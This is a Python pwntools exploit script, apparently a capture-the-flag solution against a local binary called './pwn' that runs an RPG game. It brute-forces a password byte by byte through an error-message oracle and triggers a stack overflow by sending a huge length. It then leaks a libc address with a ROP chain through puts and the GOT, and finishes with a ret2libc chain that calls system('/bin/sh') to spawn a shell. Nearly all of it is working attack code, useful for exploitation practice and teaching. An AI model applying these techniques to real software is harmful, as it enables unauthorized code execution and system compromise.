from pwn import *

		
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# gdb.attach(p)
# pause()
known_passwd = b''
p.recvuntil(b'>')
for i in range(0,16):
    # pause()
    for j in range(0,256):
        p.send(b'designer\x00')
        p.recvuntil(b'lease input your password:')
        p.sendafter(b'>', known_passwd + bytes([j]))
        recvs = p.recvuntil(b'>')
        log.info(recvs)
        if b'Welcome to the RPG game!' in recvs:
            # known_passwd += bytes([j])
            log.success(b'password found')
            break
        elif b'Wrong Password!' in recvs:
            continue
        elif b'Password Invalid!' in recvs:
            log.info(f"Found password byte {i}: {j}")
            known_passwd += bytes([j])
            break
    if b'Welcome to the RPG game!' in recvs:
        log.success(b'password found')
        break
ret = 0x40101a
# 0x00000000004011a8 : pop rax ; add dil, dil ; loopne 0x401215 ; nop ; ret
fake_rbp = 0x404b00
pop_rax = 0x4011a8
puts_got = elf.got['puts']
fread_got = elf.got['fread']
mov_rdi_rax_call_put = 0x4014bb
p.send(b'2147483648\x00')  # send a large number to trigger the overflow
p.recvuntil(b'Please input your payload:')
pause()
gdb.attach(p)
p.send(b'a'*0x70 + p64(fake_rbp) + p64(pop_rax)+ p64(puts_got - 0x2e6b) +p64(ret) + p64(mov_rdi_rax_call_put) )
# p.send(b'a'*0x70 + p64(fake_rbp) + p64(pop_rax)+ p64(puts_got) +p64(ret) + p64(mov_rdi_rax_call_put) )
p.recvuntil(b'Bye!\n')
libc_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'libc_addr: {hex(libc_addr)}')
libc.address = libc_addr - 0x87be0
log.info(f'libc base: {hex(libc.address)}')
system_addr = libc.symbols['system']
binsh_addr = libc.search(b'/bin/sh\x00').__next__()
#0x000000000010f75b : pop rdi ; ret

pop_rdi_ret = libc.address + 0x000000000010f75b
p.send(b'designer\x00')
p.sendafter(b'Please input your password:', b'\x00'*16)
p.recvuntil(b'Welcome to the RPG game!')
p.send(b'2147483648\x00')  # send a large number to trigger the overflow
p.recvuntil(b'Please input your payload:')
p.send(b'a'*0x70 +p64(fake_rbp) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(ret) +p64(system_addr)  )

p.interactive()

